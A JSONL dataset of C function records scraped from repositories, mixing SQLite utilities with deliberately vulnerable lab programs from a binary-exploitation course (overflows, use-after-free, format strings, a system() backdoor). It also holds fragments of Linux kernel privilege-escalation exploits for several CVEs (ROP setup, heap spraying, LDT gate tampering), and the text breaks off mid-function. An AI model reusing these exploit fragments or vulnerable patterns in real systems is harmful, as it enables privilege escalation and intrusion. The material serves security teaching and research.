{"docstring": "/*\n** Compare the 19-character string zNum against the text representation\n** value 2^63:  9223372036854775808.  Return negative, zero, or positive\n** if zNum is less than, equal to, or greater than the string.\n** Note that zNum must contain exactly 19 characters.\n**\n** Unlike memcmp() this routine is guaranteed to return the difference\n** in the values of the last digit if the only difference is in the\n** last digit.  So, for example,\n**\n**      totypeCompare2pow63(\"9223372036854775800\")\n**\n** will return -8.\n*/\n", "func_signal": "static int totypeCompare2pow63(const char *zNum)", "code": "{\n  int c = 0;\n  int i;\n                    /* 012345678901234567 */\n  const char *pow63 = \"922337203685477580\";\n  for(i=0; c==0 && i<18; i++){\n    c = (zNum[i]-pow63[i])*10;\n  }\n  if( c==0 ){\n    c = zNum[18] - '8';\n  }\n  return c;\n}", "path": "sqlite/ext/misc/totype.c", "commit_date": "2020-01-07 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/* Show the content of the %_stat table\n*/\n", "func_signal": "static void showStat(sqlite3 *db, const char *zTab)", "code": "{\n  sqlite3_stmt *pStmt;\n  pStmt = prepare(db, \"SELECT id, value FROM '%q_stat'\", zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    printf(\"stat[%d] =\", sqlite3_column_int(pStmt, 0));\n    switch( sqlite3_column_type(pStmt, 1) ){\n      case SQLITE_INTEGER: {\n        printf(\" %d\\n\", sqlite3_column_int(pStmt, 1));\n        break;\n      }\n      case SQLITE_BLOB: {\n        unsigned char *x = (unsigned char*)sqlite3_column_blob(pStmt, 1);\n        int len = sqlite3_column_bytes(pStmt, 1);\n        int i = 0;\n        sqlite3_int64 v;\n        while( i<len ){\n          i += getVarint(x, &v);\n          printf(\" %lld\", v);\n        }\n        printf(\"\\n\");\n        break;\n      }\n    }\n  }\n  sqlite3_finalize(pStmt);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Check to see if the block of a %_segments entry is NULL.\n*/\n", "func_signal": "static int isNullSegment(sqlite3 *db, const char *zTab, sqlite3_int64 iBlockId)", "code": "{\n  sqlite3_stmt *pStmt;\n  int rc = 1;\n\n  pStmt = prepare(db, \"SELECT block IS NULL FROM '%q_segments'\"\n                      \" WHERE blockid=%lld\", zTab, iBlockId);\n  if( sqlite3_step(pStmt)==SQLITE_ROW ){\n    rc = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  return rc;\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Close a tokenization cursor previously opened by a call to\n** simpleOpen() above.\n*/\n", "func_signal": "static int unicodeClose(sqlite3_tokenizer_cursor *pCursor)", "code": "{\n  unicode_cursor *pCsr = (unicode_cursor *) pCursor;\n  sqlite3_free(pCsr->zToken);\n  sqlite3_free(pCsr);\n  return SQLITE_OK;\n}", "path": "sqlite/ext/fts3/fts3_unicode.c", "commit_date": "2019-01-08 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/* bugs galore... but no memory corruption! */\n", "func_signal": "int main(int argc, char * argv[])", "code": "{\n    struct data * strings[MAX_STR] = {0};\n    struct number * numbers[MAX_NUM] = {0};\n    struct data * tempstr = NULL;\n    struct number * tempnum = NULL;\n\n    int strcnt = 0;\n    int numcnt = 0;\n    unsigned int choice = 0;\n    unsigned int index = 0;\n\n    while(1)\n    {\n        print_menu();\n\n        /* get menu option */\n        if((choice = get_unum()) == EOF)\n            break;\n\n        /* make a string */\n        if(choice == 1)\n        {\n            if(strcnt < MAX_STR)\n            {\n                tempstr = malloc(sizeof(struct data));\n\n                /* no memory corruption this time */\n                printf(\"Input string to store: \");\n                fgets(tempstr->buffer, 20, stdin);\n                tempstr->buffer[strcspn(tempstr->buffer, \"\\n\")] = 0;\n\n                /* pick a print function */\n                tempstr->print = strlen(tempstr->buffer) > 10 ? big_str : small_str;\n\n                /* store the string to our master list */\n                strings[++strcnt] = tempstr;\n                printf(\"Created new string!\\n\");\n            }\n            else\n                printf(\"Please delete a string before trying to make another!\\n\");\n        }\n\n        /* make a number */\n        else if(choice == 2)\n        {\n            if(numcnt < MAX_NUM)\n            {\n                tempnum = malloc(sizeof(struct number));\n\n                printf(\"Input number to store: \");\n                tempnum->num = get_unum();\n\n                /* pick a print function */\n                tempnum->print = tempnum->num > 0x31337 ? big_num : small_num;\n\n                /* store the number to our master list */\n                numbers[++numcnt] = tempnum;\n                printf(\"Created new number!\\n\");\n            }\n            else\n                printf(\"Please delete a number before trying to make another!\\n\");\n        }\n\n        /* delete a string */\n        else if(choice == 3)\n        {\n            if(strcnt && strings[strcnt])\n            {\n                free(strings[strcnt--]);\n                printf(\"Deleted most recent string!\\n\");\n            }\n            else\n                printf(\"There are no strings left to delete!\\n\");\n        }\n\n        /* delete a number */\n        else if(choice == 4)\n        {\n            if(numcnt && numbers[numcnt])\n            {\n                free(numbers[numcnt--]);\n                printf(\"Deleted most recent number!\\n\");\n            }\n            else\n                printf(\"There are no numbers left to delete!\\n\");\n        }\n\n        /* print a string */\n        else if(choice == 5)\n        {\n            printf(\"String index to print: \");\n            index = get_unum();\n\n            if(index < MAX_STR && strings[index])\n                strings[index]->print(strings[index]->buffer);\n            else\n                printf(\"There is no string to print!\\n\");\n        }\n\n        /* print a number */\n        else if(choice == 6)\n        {\n            printf(\"Number index to print: \");\n            index = get_unum();\n\n            if(index < MAX_NUM && numbers[index])\n                numbers[index]->print(numbers[index]->num);\n            else\n                printf(\"There is no number to print!\\n\");\n        }\n\n        /* quit */\n        else if(choice == 7)\n            break;\n\n        /* base case */\n        else\n            printf(\"Invalid choice!\\n\");\n\n        index = 0;\n        choice = 0;\n        printf(\"\\n\");\n    }\n\n    printf(\"See you tomorrow!\\n\");\n    return EXIT_SUCCESS;\n}", "path": "MBE/src/lab07/lab7C.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* print a message at a select index */\n", "func_signal": "int print_index()", "code": "{\n    char numbuf[32];\n    unsigned int i = 0;\n\n    /* get message index to print */\n    printf(\"-Input message index to print: \");\n    fgets(numbuf, sizeof(numbuf), stdin);\n    i = strtoul(numbuf, NULL, 10);\n\n    if(i >= MAX_MSG || messages[i] == NULL)\n    {\n        printf(\"-Invalid message index!\\n\");\n        return 1;\n    }\n\n    /* print the message of interest */\n    messages[i]->print_msg(messages[i]);\n\n    return 0;\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* log the user in */\n", "func_signal": "int login()", "code": "{\n    printf(\"WELCOME MR. FALK\\n\");\n\n    /* you win */\n    system(\"/bin/sh\");\n    return 0;\n}", "path": "MBE/src/lab06/lab6B.c", "commit_date": "2015-07-25 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* free a secure message */\n", "func_signal": "int destroy_message()", "code": "{\n    char numbuf[32];\n    unsigned int i = 0;\n\n    /* get message index to destroy */\n    printf(\"-Input message index to destroy: \");\n    fgets(numbuf, sizeof(numbuf), stdin);\n    i = strtoul(numbuf, NULL, 10);\n\n    if(i >= MAX_MSG || messages[i] == NULL)\n    {\n        printf(\"-Invalid message index!\\n\");\n        return 1;\n    }\n\n    /* destroy message */\n    memset(messages[i], 0, sizeof(struct msg));\n    free(messages[i]);\n    messages[i] = NULL;\n\n    return 0;\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* doom's super secret password mangling scheme */\n", "func_signal": "void hash_pass(char * password, char * username)", "code": "{\n    int i = 0;\n\n    /* hash pass with chars of username */\n    while(password[i] && username[i])\n    {\n        password[i] ^= username[i];\n        i++;\n    }\n\n    /* hash rest of password with a pad char */\n    while(password[i])\n    {\n        password[i] ^= 0x44;\n        i++;\n    }\n\n    return;\n}", "path": "MBE/src/lab06/lab6B.c", "commit_date": "2015-07-25 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* gcc -pie -fPIE -fno-stack-protector -o aslr_leak2 ./aslr_leak2.c */\n", "func_signal": "int main(int argc, char * argv[])", "code": "{\n    char leaky[16];\n    \n    if(argc < 2)\n    {\n        printf(\"Please provide two arguments.\\n\");\n        return 1;\n    }\n\n    memcpy(leaky, argv[1], 16);\n    \n    printf(\"Leaky buffer: %s\\n\", leaky);\n    printf(\"another round? : \");\n    fgets(leaky, 64, stdin);\n\n    return 0;\n}", "path": "MBE/src/lecture/aslr/aslr_leak2.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/*\n * compiled with:\n * gcc -O0 -fno-stack-protector lab2C.c -o lab2C\n */\n", "func_signal": "void shell()", "code": "{\n\tprintf(\"You did it.\\n\");\n\tsystem(\"/bin/sh\");\n}", "path": "MBE/src/lab02/lab2C.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* doom's super secure password read function */\n", "func_signal": "int load_pass(char ** password)", "code": "{\n    FILE * fd = 0;\n    int fail = -1;\n    int psize = 0;\n\n    /* open the password file */\n    fd = fopen(\"/home/lab6A/.pass\", \"r\");\n    if(fd == NULL)\n    {\n        printf(\"Could not open secret pass!\\n\");\n        return fail;\n    }\n\n    /* get the size of the password */\n    if(fseek(fd, 0, SEEK_END))\n    {\n        printf(\"Failed to seek to end of pass!\\n\");\n        return fail;\n    }\n\n    psize = ftell(fd);\n\n    if(psize == 0 || psize == -1)\n    {\n        printf(\"Could not get pass size!\\n\");\n        return fail;\n    }\n\n    /* reset stream */\n    if(fseek(fd, 0, SEEK_SET))\n    {\n        printf(\"Failed to see to the start of pass!\\n\");\n        return fail;\n    }\n\n    /* allocate a buffer for the password */\n    *password = (char *)malloc(psize);\n    if(password == NULL)\n    {\n        printf(\"Could not malloc for pass!\\n\");\n        return fail;\n    }\n\n    /* make sure we read in the whole password */\n    if(fread(*password, sizeof(char), psize, fd) != psize)\n    {\n        printf(\"Could not read secret pass!\\n\");\n        free(*password);\n        return fail;\n    }\n\n    fclose(fd);\n\n    /* successfully read in the password */\n    return psize;\n}", "path": "MBE/src/lab06/lab6B.c", "commit_date": "2015-07-25 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* the vulnerability is in here */\n", "func_signal": "void print_menu()", "code": "{\n    printf(\"+---------------------------------------+\\n\"\n           \"|        Doom's OTP Service v1.0        |\\n\"\n           \"+---------------------------------------+\\n\"\n           \"|------------ Services Menu ------------|\\n\"\n           \"|---------------------------------------|\\n\"\n           \"| 1. Create secure message              |\\n\"\n           \"| 2. Edit secure message                |\\n\"\n           \"| 3. Destroy secure message             |\\n\"\n           \"| 4. Print message details              |\\n\"\n           \"| 5. Quit                               |\\n\"\n           \"+---------------------------------------+\\n\");\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* print information about the given message */\n", "func_signal": "void print_message(struct msg * to_print)", "code": "{\n    unsigned int i = 0;\n    char * xor_pad;\n    char * message;\n\n    xor_pad = (char *)&to_print->xor_pad;\n    message = (char *)&to_print->message;\n\n    /* print the message's xor pad */\n    printf(\"\\nXOR Pad: \\n\"\n           \"-----------------------------------------\\n\");\n\n    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)\n    {\n        printf(\"%02x\", xor_pad[i] & 0xFF);\n        if(i % 32 == 31)\n            puts(\"\");\n    }\n\n    /* print encrypted message */\n    printf(\"\\nEncrypted Message: \\n\"\n           \"-----------------------------------------\\n\");\n\n    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)\n    {\n        printf(\"%02x\", message[i] & 0xFF);\n        if(i % 32 == 31)\n            puts(\"\");\n    }\n\n    puts(\"\");\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* gcc -static -o rop_pivot rop_pivot.c */\n", "func_signal": "int main(int argc, char * argv[])", "code": "{\n    char buffer[128] = {0};\n    int overwrite[1] = {0};\n\n    if(argc < 3)\n    {\n        printf(\"I need two arguments\\n\");\n    \tprintf(\"Usage: %s [overwrite index] [overwrite address]\\n\", argv[0]);\n        return 1;\n    }\n\n    /* create a pivot scenario */\n    printf(\"Overwriting 0x%08x with 0x%08x\\n\", \\\n\toverwrite[strtoul(argv[1], NULL, 10)], strtoul(argv[2], NULL, 10));\n    overwrite[strtoul(argv[1], NULL, 10)] = strtoul(argv[2], NULL, 10);\n\n    /* read a rop chain */\n    printf(\"insert ropchain: \");\n    fgets(buffer, 128, stdin);\n\n    /* program always returns 0 */\n    return 0;\n}", "path": "MBE/src/lecture/rop/rop_pivot.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* returns the contents of a specified storage index */\n", "func_signal": "int read_number(unsigned int * data)", "code": "{\n    unsigned int index = 0;\n\n    /* get index to read from */\n    printf(\" Index: \");\n    index = get_unum();\n\n    printf(\" Number at data[%u] is %u\\n\", index, data[index]);\n\n    return 0;\n}", "path": "MBE/src/lab03/lab3A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* apply one time pad */\n", "func_signal": "void encdec_message(unsigned int * message, unsigned int * xor_pad)", "code": "{\n    int i = 0;\n    for(i = 0; i < MAX_BLOCKS; i++)\n        message[i] ^= xor_pad[i];\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* debug functionality, not used in production */\n", "func_signal": "void secret_backdoor()", "code": "{\n    char cmd[128];\n\n    /* reads a command and executes it */\n    fgets(cmd, 128, stdin);\n    system(cmd);\n\n    return;\n}", "path": "MBE/src/lab06/lab6C.c", "commit_date": "2015-09-28 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/*\n * compiled with:\n * gcc -O0 -fno-stack-protector lab2A.c -o lab2A\n */\n", "func_signal": "void shell()", "code": "{\n\tprintf(\"You got it\\n\");\n\tsystem(\"/bin/sh\");\n}", "path": "MBE/src/lab02/lab2A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "//gcc -fstack-protector-all -mpreferred-stack-boundary=2 -o canary canary.c\n", "func_signal": "void contrivedLeak()", "code": "{\n    char buf[512];\n    scanf(\"%s\", buf);\n    printf(buf);\n    return;\n}", "path": "MBE/src/lecture/misc/canary.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "//Think of this as the familiar \"main\" function\n", "func_signal": "static int __init mod_init(void)", "code": "{\n    int ret;\n    // Register Device to /dev\n    ret = misc_register(&pwn_dev);\n    \n    // Allocate Space for the key \n    sekret = kmalloc(sizeof(struct key_material), GFP_KERNEL);\n    get_random_bytes(&sekret->key, 1024);\n   \n    // Set the algorithm to a sane default\n    sekret->algo = algo_xor;   \n\n    printk(KERN_INFO \"Finished Init\\n\"); \n    printk(KERN_INFO \"Can u get r00t?\\n\");\n    return 0;    \n}", "path": "MBE/src/lab10/lab10C.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* get a number from the user and store it */\n", "func_signal": "int store_number(unsigned int * data)", "code": "{\n    unsigned int input = 0;\n    unsigned int index = 0;\n\n    /* get number to store */\n    printf(\" Number: \");\n    input = get_unum();\n\n    /* get index to store at */\n    printf(\" Index: \");\n    index = get_unum();\n\n    /* make sure the slot is not reserved */\n    if(index % 3 == 0 || (input >> 24) == 0xb7)\n    {\n        printf(\" *** ERROR! ***\\n\");\n        printf(\"   This index is reserved for quend!\\n\");\n        printf(\" *** ERROR! ***\\n\");\n\n        return 1;\n    }\n\n    /* save the number to data storage */\n    data[index] = input;\n\n    return 0;\n}", "path": "MBE/src/lab03/lab3A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* creates a message */\n", "func_signal": "int create_message()", "code": "{\n    int i, j;\n    struct msg * new_msg = NULL;\n\n    /* find a free message slot */\n    for(i = 0; i < MAX_MSG; i++)\n        if(messages[i] == NULL)\n            break;\n\n    /* make sure we actually found an empty slot */\n    if(messages[i])\n    {\n        printf(\"-No message slots left!\\n\");\n        return 1;\n    }\n\n    printf(\"-Using message slot #%u\\n\", i);\n\n    /* initialize new message */\n    new_msg = malloc(sizeof(struct msg));\n    memset(new_msg, 0, sizeof(struct msg));\n    new_msg->print_msg = &print_message;\n\n    for(j = 0; j < MAX_BLOCKS; j++)\n        new_msg->xor_pad[j] = rand();\n\n    /* get the length of data the user intends to encrypt */\n    printf(\"-Enter data length: \");\n\n    new_msg->msg_len = get_unum();\n\n    if(new_msg->msg_len == 0)\n    {\n        printf(\"-Message length must be greater than zero!\\n\");\n        free(new_msg);\n        return 1;\n    }\n\n    /* make sure the message length is no bigger than the xor pad */\n    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)\n        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;\n\n    /* read in the message to encrypt with the xor pad */\n    printf(\"-Enter data to encrypt: \");\n    read(0, &new_msg->message, new_msg->msg_len);\n\n    /* encrypt message */\n    encdec_message(new_msg->message, new_msg->xor_pad);\n\n    /* save the new message to the global list */\n    messages[i] = new_msg;\n\n    return 0;\n}", "path": "MBE/src/lab07/lab7A.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "/* gcc -fno-stack-protector --static -o lab5B lab5B.c */\n", "func_signal": "int main()", "code": "{\n\n    char buffer[128] = {0};\n\n    printf(\"Insert ROP chain here:\\n\");\n    gets(buffer);\n\n    return EXIT_SUCCESS;\n}", "path": "MBE/src/lab05/lab5B.c", "commit_date": "2015-06-22 00:00:00", "repo_name": "RPISEC/MBE", "stars": 5295, "license": "bsd-2-clause", "language": "c", "size": 355}
{"docstring": "// Checking root.\n", "func_signal": "void exec_shell()", "code": "{\n  char *args[] = {\"/bin/sh\", \"-i\", NULL};\n  execve(\"/bin/sh\", args, NULL);\n}", "path": "linux-kernel-exploits/2016/CVE-2016-2384/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Map a fake stack where the ROP payload resides.\n", "func_signal": "void mmap_stack()", "code": "{\n  uint64_t stack_addr;\n  int stack_offset;\n  uint64_t* stack;\n  int page_size;\n\n  page_size = getpagesize();\n\n  stack_addr = (XCHG_EAX_ESP_RET & 0x00000000ffffffffL) & ~(page_size - 1);\n  stack_offset = XCHG_EAX_ESP_RET % page_size;\n\n  stack = mmap((void *)stack_addr, page_size, PROT_READ | PROT_WRITE,\n      MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n  if (stack == MAP_FAILED) {\n    perror(\"[-] mmap()\");\n    exit(EXIT_FAILURE);\n  }\n\n  stack = (uint64_t *)((char *)stack + stack_offset);\n\n  CHAIN_SAVE_EAX;\n  CHAIN_SET_CR4;\n  CHAIN_JMP_PAYLOAD;\n}", "path": "linux-kernel-exploits/2016/CVE-2016-2384/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Executes func() from process context.\n", "func_signal": "void kernel_exec(void *func)", "code": "{\n\tint i;\n\tstruct dccp_handle dh;\n\tstruct udp_fifo_handle uh1, uh2, uh3;\n\tchar dummy[2048];\n\tchar buffer[2048];\n\n\tprintf(\"[.] executing %p\\n\", func);\n\n\tmemset(&dummy[0], 0, 2048);\n\tinit_skb_buffer(&buffer[0], func);\n\n\tudp_fifo_init(&uh1);\n\tudp_fifo_init(&uh2);\n\tudp_fifo_init(&uh3);\n\n\tdebug(\"kmalloc pad\");\n\tkmalloc_pad();\n\n\tdebug(\"kmalloc warm\");\n\tkmalloc_warm();\n\n\tdebug(\"dccp init\");\n\tdccp_init(&dh, port++);\n\n\tdebug(\"dccp kmalloc kfree\");\n\tdccp_kmalloc_kfree(&dh);\n\n\tdebug(\"catch 1\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\tudp_fifo_kmalloc(&uh1, &dummy[0]);\n\n\tdebug(\"dccp kfree again:\");\n\tdccp_kfree_again(&dh);\n\n\tdebug(\"catch 2\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\tudp_fifo_kmalloc(&uh2, &dummy[0]);\n\n\tdebug(\"catch 1 -> overwrite\");\n\tfor (i = 0; i < CATCH_FIRST; i++) {\n\t\tudp_fifo_kfree(&uh1);\n\t\tsendmmsg_kmalloc_kfree(port++, &buffer[0]);\n\t}\n\tdebug(\"catch 2 -> free & trigger\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\tudp_fifo_kfree(&uh2);\n\n\tdebug(\"catch 1 & 2\");\n\tfor (i = 0; i < CATCH_AGAIN; i++)\n\t\tudp_fifo_kmalloc(&uh3, &dummy[0]);\n\n\tprintf(\"[.] done\\n\");\n}", "path": "linux-kernel-exploits/2017/CVE-2017-6074/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tmake kernel page maps before and after allocating LDT\n", "func_signal": "void scan_mm_start()", "code": "{\nstatic int npg=0;\nstatic struct modify_ldt_ldt_s l;\n\n\tpnum++;\n\tif(pnum==1) {\n\t\tpidx = max_page-1;\n\t}\n\telse if(pnum==2) {\n\t\tmemset(&l, 0, sizeof(l));\n\t\tl.entry_number = LDT_ENTRIES-1;\n\t\tl.seg_32bit = 1;\n\t\tl.base_addr = MAGIC >> 16;\n\t\tl.limit = MAGIC & 0xffff;\n\t\tl.limit_in_pages = 1;\n\t\tif( modify_ldt(1, &l, sizeof(l)) != 0 )\n\t\t\tfatal(\"modify_ldt\", 1);\n\t\tpidx = max_page-1;\n\t}\n\telse if(pnum==3) {\n\t\tnpg=0;\n\t\tfor(pidx=0; pidx<=max_page-1; pidx++) {\n\t\t\tif(pagemap[pidx]) {\n\t\t\t\tnpg++;\n\t\t\t\tfflush(stdout);\n\t\t\t}\n\t\t\telse if(npg == LDT_PAGES) {\n\t\t\t\tnpg=0;\n\t\t\t\ttry_to_exploit(addr_min+(pidx-1)*PAGE_SIZE);\n\t\t\t} else {\n\t\t\t\tnpg=0;\n\t\t\t}\n\t\t}\n\t\tfatal(\"find LDT\", 1);\n\t}\n\n//\tsave context & scan page table\n\t__asm__(\"movl\t%%esp, %0\" : :\"m\"(old_esp) );\n\tmap_addr = addr_max;\n\tscan_mm();\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tkernel page table scan code\n", "func_signal": "void scan_mm()", "code": "{\n\tmap_addr -= PAGE_SIZE;\n\tif(map_addr <= (unsigned)addr_min)\n\t\tscan_mm_start();\n\n\tscnt=0;\n\tval = *(int*)map_addr;\n\tscan_mm_finish();\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\ttry to race do_brk sleeping on kmalloc, may need modification for SMP\n", "func_signal": "int raceme(void* v)", "code": "{\n\tfinish=1;\n\n\tfor(;;) {\n\t\terrno = 0;\n\n//\tcheck if raced:\nrecheck:\n\t\tif(!go) sys_sched_yield();\n\t\tsys_gettimeofday(&tm2, NULL);\n\t\tdelta = tmdiff(&tm1, &tm2);\n\t\tif(!smp_max && delta < (unsigned)delta_max) goto recheck;\n\t\tsmp = smp_max;\n\n//\tcheck if lib VMAs exist as expected under race condition\nrecheck2:\n\t\tval = sys_madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL);\n\t\tif(val) continue;\n\t\terrno = 0;\n\t\tval = sys_madvise((void*) (lib_addr+PAGE_SIZE),\n\t\t\t\tLIB_SIZE-PAGE_SIZE, MADV_NORMAL);\n\t\tif( !val || (val<0 && errno!=ENOMEM) ) continue;\n\n//\tSMP?\n\t\tsmp--;\n\t\tif(smp>=0) goto recheck2;\n\n//\trecheck race\n\t\tif(!go) continue;\n\t\tfinish++;\n\n//\twe need to free one vm_area_struct for mmap to work\n\t\tval = sys_mprotect(map_addr, PAGE_SIZE, map_flags);\n\t\tif(val) fatal(\"mprotect\", 0);\n\t\tval = sys_mmap2(lib_addr + PAGE_SIZE, PAGE_SIZE*3, PROT_NONE,\n\t\t\t      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);\n\t\tif(-1==val) fatal(\"mmap2 race\", 0);\n\t\tprintf(\"\\n[+] race won maps=%d\", map_count); fflush(stdout);\n\t\t_exit(0);\n\t}\n\nreturn 0;\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tempty SLAB caches\n", "func_signal": "void wipe_slab()", "code": "{\n\tsignal(SIGUSR1, chldcnt);\n\tprintf(\"\\n[+] SLAB cleanup\"); fflush(stdout);\n\tfor(;;) {\n\t\tccnt=0;\n\t\tval++;\n\t\tcpid = fork();\n\t\tif(!cpid)\n\t\t\tdo_wipe();\n\n\t\twhile(!ccnt) sys_sched_yield();\n\t\tif( get_slab_objs(\"vm_area_struct\") <= SLAB_THRSH )\n\t\t\tbreak;\n\t}\n\tsignal(SIGUSR1, SIG_DFL);\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tmodify LDT & exec\n", "func_signal": "void try_to_exploit(unsigned addr)", "code": "{\nvolatile int r, *v;\n\n\tprintf(\"\\n[!] try to exploit 0x%.8x\", addr); fflush(stdout);\n\tunlink(libname);\n\n\tr = sys_mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE|map_flags);\n\tif(r) fatal(\"mprotect 1\", 1);\n\n//\tcheck if really LDT\n\tv = (void*) (addr + (ENTRY_GATE*LDT_ENTRY_SIZE % PAGE_SIZE) );\n\tsignal(SIGSEGV, sigfailed);\n\tr = *v;\n\tif(r != MAGIC) {\n\t\tprintf(\"\\n[-] FAILED val = 0x%.8x\", r); fflush(stdout);\n\t\tfatal(\"find LDT\", 1);\n\t}\n\n//\tyeah, setup CPL0 gate\n\tv[0] = ((unsigned)(SEL_LCS)<<16) | ((unsigned)kcode & 0xffffU);\n\tv[1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;\n\tprintf(\"\\n[+] gate modified ( 0x%.8x 0x%.8x )\", v[0], v[1]); fflush(stdout);\n\n//\tsetup CPL0 segment descriptors (we need the 'accessed' versions ;-)\n\tv = (void*) (addr + (ENTRY_LCS*LDT_ENTRY_SIZE % PAGE_SIZE) );\n\tv[0] = 0x0000ffff; /* kernel 4GB code at 0x00000000 */\n\tv[1] = 0x00cf9b00;\n\n\tv = (void*) (addr + (ENTRY_LDS*LDT_ENTRY_SIZE % PAGE_SIZE) );\n\tv[0] = 0x0000ffff; /* kernel 4GB data at 0x00000000 */\n\tv[1] = 0x00cf9300;\n\n//\treprotect to get only one big VMA\n\tr = sys_mprotect(addr, PAGE_SIZE, PROT_READ|map_flags);\n\tif(r) fatal(\"mprotect 2\", 1);\n\n//\tCPL0 transition\n\tsys_sched_yield();\n\tval = callme_1() + callme_2();\n\tasm(\"lcall $\" xstr(SEL_GATE) \",$0x0\");\n\tif( getuid()==0 || (val==31337 && strlen(hellc0de)==16) ) {\n\t\tprintf(\"\\n[+] exploited, uid=0\\n\\n\" ); fflush(stdout);\n\t} else {\n\t\tprintf(\"\\n[-] uid change failed\" ); 